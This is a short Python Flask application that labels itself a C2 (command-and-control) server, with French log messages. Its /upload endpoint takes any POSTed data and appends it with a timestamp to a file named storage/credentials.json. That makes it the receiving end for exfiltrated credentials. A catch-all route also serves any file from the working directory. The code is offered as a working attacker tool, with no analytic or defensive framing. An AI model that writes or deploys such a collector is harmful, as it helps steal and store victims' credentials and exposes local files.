from flask import Flask, request, send_from_directory
import json
import os
from datetime import datetime

app = Flask(__name__)

STORAGE_PATH = "storage/credentials.json"

if not os.path.exists("storage"):
    os.makedirs("storage")


@app.route('/<path:filename>')
def serve_file(filename):
    return send_from_directory('.', filename)


@app.route('/upload', methods=['POST'])
def upload():
    try:
        raw = request.get_data(as_text=True)

        if not raw:
            print("[-] Corps vide reçu")
            return "No data", 400

        # On essaie de parser, sinon on le stocke brut
        try:
            data = json.loads(raw)
        except:
            data = {"raw_content": raw}

        data['received_at'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        if os.path.exists(STORAGE_PATH):
            with open(STORAGE_PATH, "r", encoding="utf-8") as f:
                existing = json.load(f)
        else:
            existing = []

        existing.append(data)

        with open(STORAGE_PATH, "w", encoding="utf-8") as f:
            json.dump(existing, f, indent=2, ensure_ascii=False)

        print(f"[+] Données reçues avec succès")
        return "OK", 200

    except Exception as e:
        print(f"[-] Erreur : {e}")
        return "Error", 400


if __name__ == "__main__":
    print("[*] Serveur C2 démarré sur http://0.0.0.0:8080")
    app.run(host="0.0.0.0", port=8080, debug=False)